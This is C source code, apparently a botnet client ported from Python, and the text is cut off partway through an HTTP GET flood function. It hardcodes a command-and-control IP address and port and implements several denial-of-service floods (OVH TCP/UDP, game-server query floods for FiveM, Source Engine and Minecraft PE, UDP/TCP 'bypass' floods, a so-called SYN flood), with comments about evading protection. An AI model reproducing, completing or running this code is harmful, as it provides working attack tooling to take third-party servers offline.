#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <sys/utsname.h>
#include <errno.h>
#include <ctype.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stddef.h>

// Configuration
#define C2_ADDRESS  "134.255.216.46"
#define C2_PORT     600

// Attack list - Using a fixed-size array for simplicity
#define MAX_CONCURRENT_ATTACKS 100

typedef struct {
    int active; // Flag: 0 if inactive, 1 if active
    pthread_t thread_id;
    volatile int stop_flag; // Flag to signal thread to stop
    char username[50];      // Assuming max username length
    // Pointer to allocated args memory, freed by the thread
    void* thread_args; // Generic pointer to attack_args_t_with_method
} attack_slot_t;

attack_slot_t user_attacks_slots[MAX_CONCURRENT_ATTACKS];
pthread_mutex_t user_attacks_mutex = PTHREAD_MUTEX_INITIALIZER;

// Payloads
unsigned char payload_fivem[] = {0xff, 0xff, 0xff, 0xff, 'g', 'e', 't', 'i', 'n', 'f', 'o', ' ', 'x', 'x', 'x', 0x00, 0x00, 0x00};
size_t payload_fivem_len = sizeof(payload_fivem);

unsigned char payload_vse[] = {0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00};
size_t payload_vse_len = sizeof(payload_vse);

unsigned char payload_mcpe[] = {0x61, 0x74, 0x6f, 0x6d, 0x20, 0x64, 0x61, 0x74, 0x61, 0x20, 0x6f, 0x6e, 0x74, 0x6f, 0x70, 0x20, 0x6d, 0x79, 0x20, 0x6f, 0x77, 0x6e, 0x20, 0x61, 0x73, 0x73, 0x20, 0x61, 0x6d, 0x70, 0x2f, 0x74, 0x72, 0x69, 0x70, 0x68, 0x65, 0x6e, 0x74, 0x20, 0x69, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x64, 0x69, 0x63, 0x6b, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x73};
size_t payload_mcpe_len = sizeof(payload_mcpe);

unsigned char payload_hex[] = {0x55, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00, 0x01};
size_t payload_hex_len = sizeof(payload_hex);

// hex list (unused in Python logic, but defined)
int hex_list[] = {2, 4, 8, 16, 32, 64, 128};
size_t hex_list_len = sizeof(hex_list) / sizeof(hex_list[0]);

int PACKET_SIZES[] = {1024, 2048};
size_t PACKET_SIZES_len = sizeof(PACKET_SIZES) / sizeof(PACKET_SIZES[0]);

// base_user_agents (Python f-strings evaluated at definition)
const char* base_user_agents[] = {
    "Mozilla/7.5 (Windows; U; Windows NT 6.1; en-US; rv:8.2.5) Gecko/201234 Firefox/65.4.7",
    "Mozilla/6.8 (Windows; U; Windows NT 10.0; en-US; rv:9.1.2) Gecko/202187 Chrome/78.9.0",
    "Mozilla/5.9 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/555.6.7 (KHTML, like Gecko) Version/11.0.5 Safari/555.6.7",
    "Mozilla/8.1 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/588.9.0 (KHTML, like Gecko) Version/13.0.2 Chrome/99.8.1",
    "Mozilla/9.3 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/512.3.4 (KHTML, like Gecko) Version/9.0.1 Firefox/45.6.7",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
};
size_t base_user_agents_len = sizeof(base_user_agents) / sizeof(base_user_agents[0]);

// Thread arguments struct for dispatcher
typedef struct {
    char method[20]; // Assuming max method name length
    char ip[INET_ADDRSTRLEN];
    int port;
    time_t end_time;
    volatile int* stop_flag;
    attack_slot_t* slot;
} attack_args_t_with_method;

// Thread arguments struct for attack functions
typedef struct {
    char ip[INET_ADDRSTRLEN]; // Assuming IPv4
    int port;
    time_t end_time; // Use time_t for seconds since epoch
    volatile int* stop_flag; // Pointer to the shared stop flag in the slot
    attack_slot_t* slot; // Pointer back to the slot to mark inactive
} attack_args_t;


// Helper function to read random bytes from /dev/urandom
int read_urandom(unsigned char* buffer, size_t size) {
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0) {
        perror("Failed to open /dev/urandom");
        return -1;
    }
    ssize_t bytes_read = read(fd, buffer, size);
    close(fd);
    if (bytes_read != size) {
        fprintf(stderr, "Failed to read enough random bytes\n");
        return -1;
    }
    return 0;
}

// Helper function to get system architecture
char* get_architecture() {
    struct utsname name;
    if (uname(&name) == 0) {
        return strdup(name.machine); // Return a dynamically allocated copy
    } else {
        perror("Error getting architecture");
        return strdup("unknown"); // Return a dynamically allocated copy of "unknown"
    }
}

// Helper function to generate random end characters
char* generate_end(int length, const char* chara) {
    char* d = malloc(length + 1);
    if (!d) {
        perror("malloc failed for generate_end");
        return NULL;
    }
    size_t chara_len = strlen(chara);
    for (int i = 0; i < length; ++i) {
        d[i] = chara[rand() % chara_len];
    }
    d[length] = '\0';
    return d; // Caller must free
}

// Helper function to get a random user agent string
const char* rand_ua() {
    // The Python code had a syntax error here.
    // Based on the f-strings in base_user_agents, it seems the intent was
    // just to pick one of the pre-formatted strings.
    return base_user_agents[rand() % base_user_agents_len];
}

// Structure to hold OVH_BUILDER results
typedef struct {
    unsigned char* packet;
    size_t length;
} ovh_packet_t;

typedef struct {
    ovh_packet_t* packets;
    size_t count;
} ovh_packets_t;

// Helper function to free OVH_BUILDER results
void free_ovh_packets(ovh_packets_t* packets) {
    if (!packets || !packets->packets) return;
    for (size_t i = 0; i < packets->count; ++i) {
        free(packets->packets[i].packet);
    }
    free(packets->packets);
    packets->packets = NULL;
    packets->count = 0;
}

// OVH_BUILDER function
ovh_packets_t OVH_BUILDER(const char* ip, int port) {
    ovh_packets_t result = {NULL, 0};
    int hex_count = sizeof(hex_list) / sizeof(hex_list[0]);
    const char* paths[] = {"/0/0/0/0/0/0", "/0/0/0/0/0/0/", "\\0\\0\\0\\0\\0\\0", "\\0\\0\\0\\0\\0\\0\\"};
    size_t paths_count = sizeof(paths) / sizeof(paths[0]);

    // Total packets = hex_count * hex_count * paths_count
    result.count = hex_count * hex_count * paths_count;
    result.packets = malloc(result.count * sizeof(ovh_packet_t));
    if (!result.packets) {
        perror("malloc failed for OVH_BUILDER packets array");
        result.count = 0;
        return result;
    }

    unsigned char random_parts[hex_count * hex_count][2048]; // Store generated random parts

    // Generate all random parts first
    for (int i = 0; i < hex_count; ++i) {
        for (int j = 0; j < hex_count; ++j) {
            if (read_urandom(random_parts[i * hex_count + j], 2048) != 0) {
                 fprintf(stderr, "Failed to generate random part for OVH_BUILDER\n");
                 free_ovh_packets(&result); // Clean up
                 result.count = 0; // Indicate failure
                 return result;
            }
        }
    }

    int packet_index = 0;
    char port_str[10];
    sprintf(port_str, "%d", port);

    // Build packets
    for (int i = 0; i < hex_count; ++i) {
        for (int j = 0; j < hex_count; ++j) {
            unsigned char* current_random_part = random_parts[i * hex_count + j];
            for (size_t k = 0; k < paths_count; ++k) {
                const char* p = paths[k];
                char* end = generate_end(4, "\n\r"); // Generate end string
                if (!end) {
                    free_ovh_packets(&result);
                    result.count = 0;
                    return result;
                }

                // Calculate required buffer size
                // "PGET " + p + random_part + " HTTP/1.1\nHost: " + ip + ":" + port_str + end
                size_t packet_len = strlen("PGET ") + strlen(p) + 2048 + strlen(" HTTP/1.1\nHost: ") + strlen(ip) + strlen(":") + strlen(port_str) + strlen(end);

                result.packets[packet_index].packet = malloc(packet_len);
                if (!result.packets[packet_index].packet) {
                    perror("malloc failed for OVH_BUILDER packet");
                    free(end);
                    free_ovh_packets(&result);
                    result.count = 0;
                    return result;
                }

                // Construct the packet using memcpy
                size_t current_offset = 0;
                memcpy(result.packets[packet_index].packet + current_offset, "PGET ", 5); current_offset += 5;
                memcpy(result.packets[packet_index].packet + current_offset, p, strlen(p)); current_offset += strlen(p);
                memcpy(result.packets[packet_index].packet + current_offset, current_random_part, 2048); current_offset += 2048;
                memcpy(result.packets[packet_index].packet + current_offset, " HTTP/1.1\nHost: ", 19); current_offset += 19;
                memcpy(result.packets[packet_index].packet + current_offset, ip, strlen(ip)); current_offset += strlen(ip);
                memcpy(result.packets[packet_index].packet + current_offset, ":", 1); current_offset += 1;
                memcpy(result.packets[packet_index].packet + current_offset, port_str, strlen(port_str)); current_offset += strlen(port_str);
                memcpy(result.packets[packet_index].packet + current_offset, end, strlen(end)); current_offset += strlen(end);

                result.packets[packet_index].length = current_offset; // Store the actual length

                free(end);
                packet_index++;
            }
        }
    }

    return result;
}


// Attack thread functions (void* func(void* arg))
void* attack_ovh_tcp(void* arg) {
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    ovh_packets_t ovh_packets = OVH_BUILDER(ip, port);
    if (ovh_packets.count == 0) {
        fprintf(stderr, "Failed to build OVH packets\n");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        int s = -1, s2 = -1;
        struct sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(port);
        if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
            // Python passes on error.
            // perror("Invalid address/ Address not supported");
            usleep(100000); // Sleep briefly to avoid tight loop on error
            continue;
        }

        // Python: s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            // Python passes on error.
            // perror("Cannot create socket s");
            usleep(100000);
            continue;
        }

        // Python: s2 = socket.create_connection((ip,port))
        // Equivalent to socket() + connect()
        s2 = socket(AF_INET, SOCK_STREAM, 0);
        if (s2 < 0) {
            // Python passes on error.
            // perror("Cannot create socket s2");
            close(s);
            usleep(100000);
            continue;
        }
        if (connect(s2, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            // Python passes on error.
            // perror("Cannot connect socket s2");
            close(s);
            close(s2);
            usleep(100000);
            continue;
        }


        // Python: s.connect((ip,port))
        if (connect(s, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            // Python passes on error.
            // perror("Cannot connect socket s");
            close(s);
            close(s2);
            usleep(100000);
            continue;
        }

        // Python: s.connect_ex((ip,port)) - This is redundant after a successful connect in Python.
        // In C, connect_ex is like a non-blocking connect check.
        // Since the previous connect was blocking and succeeded, this step is effectively a no-op or error in C.
        // We will skip translating the redundant connect_ex.

        // Python: packet = OVH_BUILDER(ip, port) - Done before the loop
        // Python: for a in packet: a = a.encode() - Packets are already bytes/unsigned char*
        // Python: for _ in range(10): s.send(a); s.sendall(a); s2.send(a); s2.sendall(a)
        for (int i = 0; i < ovh_packets.count; ++i) {
            if (*stop_flag) break;
            unsigned char* packet_data = ovh_packets.packets[i].packet;
            size_t packet_len = ovh_packets.packets[i].length;

            for (int j = 0; j < 10; ++j) {
                if (*stop_flag) break;
                // Python send/sendall might send partial data. C send/sendall might too.
                // For a simple translation, just call send/sendall.
                send(s, packet_data, packet_len, 0);
                send(s2, packet_data, packet_len, 0);
            }
             if (*stop_flag) break;
        }

        // Python closes sockets implicitly or when the 'try' block finishes or errors.
        // In C, we must close explicitly. The Python code doesn't show explicit closes inside the loop,
        // only implicitly via the `try...except` structure which restarts the loop body including socket creation.
        // This implies sockets are created and potentially leaked or closed by the OS on error/exit.
        // A more robust C would close sockets on error or after sending.
        // Let's add closes at the end of the inner loop iteration, matching the Python structure where new sockets are created each time.
        if (s >= 0) close(s);
        if (s2 >= 0) close(s2);
    }

    free_ovh_packets(&ovh_packets);
    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}

void* attack_ovh_udp(void* arg) {
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    ovh_packets_t ovh_packets = OVH_BUILDER(ip, port);
    if (ovh_packets.count == 0) {
        fprintf(stderr, "Failed to build OVH packets\n");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free_ovh_packets(&ovh_packets);
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    int s = -1;

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        // Python creates socket inside the loop. Let's match that.
        s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) {
            // Python passes on error.
            // perror("Cannot create socket");
            usleep(100000);
            continue; // Try creating socket again in next iteration
        }

        // Python: packet = OVH_BUILDER(ip, port) - Done before the loop
        // Python: for a in packet: a = a.encode() - Packets are already bytes/unsigned char*
        // Python: for _ in range(10): s.sendto(a,(ip,port))
        for (int i = 0; i < ovh_packets.count; ++i) {
            if (*stop_flag) break;
            unsigned char* packet_data = ovh_packets.packets[i].packet;
            size_t packet_len = ovh_packets.packets[i].length;

            for (int j = 0; j < 10; ++j) {
                if (*stop_flag) break;
                sendto(s, packet_data, packet_len, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
                // Python passes on sendto errors. We don't check return value.
            }
            if (*stop_flag) break;
        }

        // Python closes implicitly or on error. Close explicitly in C.
        if (s >= 0) close(s);
    }

    free_ovh_packets(&ovh_packets);
    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}


void* attack_fivem(void* arg) {
    // """Testado em Realms Servers"""
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    int s = -1;

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        // Python creates socket outside the loop. Let's match that.
        if (s < 0) {
            s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s < 0) {
                // Python passes on error.
                // perror("Cannot create socket");
                usleep(100000);
                continue; // Try creating socket again in next iteration
            }
        }

        sendto(s, payload_fivem, payload_fivem_len, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        // Python passes on sendto errors. We don't check return value.
    }

    // Python closes implicitly or on error. Close explicitly in C.
    if (s >= 0) close(s);

    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}

void* attack_mcpe(void* arg) {
    // """Testado em Realms Servers"""
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    int s = -1;

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        // Python creates socket outside the loop. Let's match that.
        if (s < 0) {
            s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s < 0) {
                // Python passes on error.
                // perror("Cannot create socket");
                usleep(100000);
                continue; // Try creating socket again in next iteration
            }
        }

        sendto(s, payload_mcpe, payload_mcpe_len, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        // Python passes on sendto errors. We don't check return value.
    }

    // Python closes implicitly or on error. Close explicitly in C.
    if (s >= 0) close(s);

    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}

void* attack_vse(void* arg) {
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    int s = -1;

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        // Python creates socket outside the loop. Let's match that.
        if (s < 0) {
            s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s < 0) {
                // Python passes on error.
                // perror("Cannot create socket");
                usleep(100000);
                continue; // Try creating socket again in next iteration
            }
        }

        sendto(s, payload_vse, payload_vse_len, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        // Python passes on sendto errors. We don't check return value.
    }

    // Python closes implicitly or on error. Close explicitly in C.
    if (s >= 0) close(s);

    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}

void* attack_hex(void* arg) {
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    int s = -1;

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        // Python creates socket outside the loop. Let's match that.
        if (s < 0) {
            s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s < 0) {
                // Python passes on error.
                // perror("Cannot create socket");
                usleep(100000);
                continue; // Try creating socket again in next iteration
            }
        }

        sendto(s, payload_hex, payload_hex_len, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        // Python passes on sendto errors. We don't check return value.
    }

    // Python closes implicitly or on error. Close explicitly in C.
    if (s >= 0) close(s);

    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}

void* attack_udp_bypass(void* arg) {
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    int sock = -1;

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        // Python creates socket outside the loop. Let's match that.
        if (sock < 0) {
            sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock < 0) {
                // Python passes on error.
                // perror("Cannot create socket");
                usleep(100000);
                continue; // Try creating socket again in next iteration
            }
        }

        // Python: packet_size = random.choice(PACKET_SIZES)
        size_t packet_size = PACKET_SIZES[rand() % PACKET_SIZES_len];
        // Python: packet = random._urandom(packet_size)
        unsigned char* packet = malloc(packet_size);
        if (!packet) {
             // Python passes on error.
             // perror("malloc failed for random packet");
             usleep(100000);
             continue; // Skip this iteration
        }
        if (read_urandom(packet, packet_size) != 0) {
             // Python passes on error.
             // fprintf(stderr, "Failed to read random bytes\n");
             free(packet);
             usleep(100000);
             continue; // Skip this iteration
        }

        sendto(sock, packet, packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        // Python passes on sendto errors. We don't check return value.

        free(packet); // Free the allocated packet
    }

    // Python closes implicitly or on error. Close explicitly in C.
    if (sock >= 0) close(sock);

    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}



void* attack_tcp_bypass(void* arg) {
    // """Tenta contornar proteção adicionando pacotes com tamanhos diferentes."""
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        int s = -1;
        // Python creates socket inside the loop and connects. Let's match that.
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            // Python passes on error.
            // perror("Cannot create socket");
            usleep(100000);
            continue; // Try creating socket again in next iteration
        }

        // Python: packet_size = random.choice(PACKET_SIZES)
        size_t packet_size = PACKET_SIZES[rand() % PACKET_SIZES_len];
        // Python: packet = random._urandom(packet_size)
        unsigned char* packet = malloc(packet_size);
        if (!packet) {
             // Python passes on error.
             // perror("malloc failed for random packet");
             if (s >= 0) close(s);
             usleep(100000);
             continue; // Skip this iteration
        }
        if (read_urandom(packet, packet_size) != 0) {
             // Python passes on error.
             // fprintf(stderr, "Failed to read random bytes\n");
             free(packet);
             if (s >= 0) close(s);
             usleep(100000);
             continue; // Skip this iteration
        }

        // Python: try: s.connect((ip, port)) ... except Exception as e: pass finally: s.close()
        // This means connect is attempted, if it fails or subsequent sends fail, the socket is closed and the outer loop continues.
        if (connect(s, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            // Python passes on error.
            // perror("Cannot connect");
            free(packet);
            if (s >= 0) close(s);
            usleep(100000);
            continue; // Outer loop continues
        }

        // Python: while time.time() < secs: s.send(packet)
        // This inner loop continues sending until the attack duration ends or send fails.
        // The Python `try...except` around the connect and inner send loop means any error inside breaks the inner loop and goes to `finally`.
        while (time(NULL) < end_time) {
             if (*stop_flag) break; // Check stop flag

             // Python passes on send errors. We don't check return value.
             if (send(s, packet, packet_size, 0) < 0) {
                 // Error occurred, break inner loop like Python's except
                 break;
             }
        }

        // Python's finally block ensures close.
        free(packet);
        if (s >= 0) close(s);
    }

    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}


void* attack_tcp_udp_bypass(void* arg) {
    // """Tenta contornar proteção variando protocolo e adicionando pacotes com tamanhos diferentes."""
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        int s = -1;
        unsigned char* packet = NULL;
        size_t packet_size = 0;
        int is_tcp = 0; // 0 for UDP, 1 for TCP

        // Python: packet_size = random.choice(PACKET_SIZES)
        packet_size = PACKET_SIZES[rand() % PACKET_SIZES_len];
        // Python: packet = random._urandom(packet_size)
        packet = malloc(packet_size);
        if (!packet) {
             // Python passes on error.
             // perror("malloc failed for random packet");
             usleep(100000);
             continue; // Skip this iteration
        }
        if (read_urandom(packet, packet_size) != 0) {
             // Python passes on error.
             // fprintf(stderr, "Failed to read random bytes\n");
             free(packet);
             usleep(100000);
             continue; // Skip this iteration
        }

        // Python: if random.choice([True, False]): s = socket(..., SOCK_STREAM); s.connect(...) else: s = socket(..., SOCK_DGRAM)
        is_tcp = rand() % 2; // 0 or 1
        int sock_type = is_tcp ? SOCK_STREAM : SOCK_DGRAM;

        s = socket(AF_INET, sock_type, 0);
        if (s < 0) {
            // Python passes on error.
            // perror("Cannot create socket");
            free(packet);
            usleep(100000);
            continue; // Try creating socket again in next iteration
        }

        if (is_tcp) {
            if (connect(s, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
                // Python passes on error.
                // perror("Cannot connect TCP socket");
                free(packet);
                if (s >= 0) close(s);
                usleep(100000);
                continue; // Outer loop continues
            }
        }

        // Python: while time.time() < secs: if s.type == SOCK_STREAM: s.send(packet) else: s.sendto(packet, (ip, port))
        // This inner loop continues sending until the attack duration ends or send/sendto fails.
        // The Python `try...except` around the socket creation, connect (if TCP), and inner send loop means any error inside breaks the inner loop and goes to `finally`.
        while (time(NULL) < end_time) {
             if (*stop_flag) break; // Check stop flag

             if (is_tcp) {
                 // Python passes on send errors. We don't check return value.
                 if (send(s, packet, packet_size, 0) < 0) {
                     // Error occurred, break inner loop like Python's except
                     break;
                 }
             } else {
                 // Python passes on sendto errors. We don't check return value.
                 if (sendto(s, packet, packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
                     // Error occurred, break inner loop like Python's except
                     break;
                 }
             }
        }

        // Python's finally block ensures close.
        free(packet);
        if (s >= 0) close(s);
    }

    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}

void* attack_syn(void* arg) {
    // """Melhorado para contornar proteções simples de SYN flood com variação de pacotes."""
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    // Python creates socket outside the loop and sets non-blocking.
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        // Python passes on error.
        // perror("Cannot create socket");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    // Python: s.setblocking(0)
    int flags = fcntl(s, F_GETFL, 0);
    if (flags < 0) {
        // Python passes on error.
        // perror("Failed to get socket flags");
        close(s);
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }
    if (fcntl(s, F_SETFL, flags | O_NONBLOCK) < 0) {
        // Python passes on error.
        // perror("Failed to set socket non-blocking");
        close(s);
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    // Python: try: s.connect((ip, port)) ... except Exception as e: pass
    // Non-blocking connect returns -1 and sets errno to EINPROGRESS or EWOULDBLOCK immediately.
    // The Python code then enters the send loop regardless of connect success, relying on send to fail if not connected.
    // We replicate this by attempting connect but ignoring the immediate EINPROGRESS/EWOULDBLOCK.
    connect(s, (struct sockaddr *)&target_addr, sizeof(target_addr));
    // Ignore return value and errno here to match Python's 'pass' on connect.

    // Python: while time.time() < secs: packet_size = random.choice(...); packet = os.urandom(...); s.send(packet)
    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        // Python: packet_size = random.choice(PACKET_SIZES)
        size_t packet_size = PACKET_SIZES[rand() % PACKET_SIZES_len];
        // Python: packet = os.urandom(packet_size)
        unsigned char* packet = malloc(packet_size);
        if (!packet) {
             // Python passes on error.
             // perror("malloc failed for random packet");
             usleep(100000);
             continue; // Skip this iteration
        }
        if (read_urandom(packet, packet_size) != 0) {
             // Python passes on error.
             // fprintf(stderr, "Failed to read random bytes\n");
             free(packet);
             usleep(100000);
             continue; // Skip this iteration
        }

        // Python passes on send errors. We don't check return value.
        // In non-blocking mode, send might return -1 with EWOULDBLOCK/EAGAIN if the buffer is full.
        // Python's 'pass' handles this. We just call send.
        send(s, packet, packet_size, 0);

        free(packet); // Free the allocated packet
    }

    // Python closes implicitly or on error. Close explicitly in C.
    if (s >= 0) close(s);

    free(args); // Free the allocated arguments struct
    args->slot->active = 0; // Mark slot as inactive
    pthread_exit(NULL);
}

void* attack_http_get(void* arg) {
    attack_args_t* args = (attack_args_t*)arg;
    char* ip = args->ip;
    int port = args->port;
    time_t end_time = args->end_time;
    volatile int* stop_flag = args->stop_flag;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        // Python passes on error.
        // perror("Invalid address/ Address not supported");
        free(args);
        args->slot->active = 0;
        pthread_exit(NULL);
    }

    while (time(NULL) < end_time) {
        if (*stop_flag) break;

        int s = -1;
        // Python creates socket inside the loop and connects. Let's match that.
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            // Python passes on error.
            // perror("Cannot create socket");
            usleep(100000);
            continue; // Try creating socket again in next iteration
        }

        // Python: try: s.connect((ip, port)) ... except: s.close()
        // If connect fails, Python closes the socket and the outer loop continues.
        if (connect(s, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            // Python passes on error.
            // perror("Cannot connect");
            if (s >= 0) close(s);
            usleep(100000);
            continue; // Outer loop continues
        }

        // Python: while time.time() < secs: s.send(f'GET ...')
        // This inner loop continues sending until the attack duration ends or send fails.
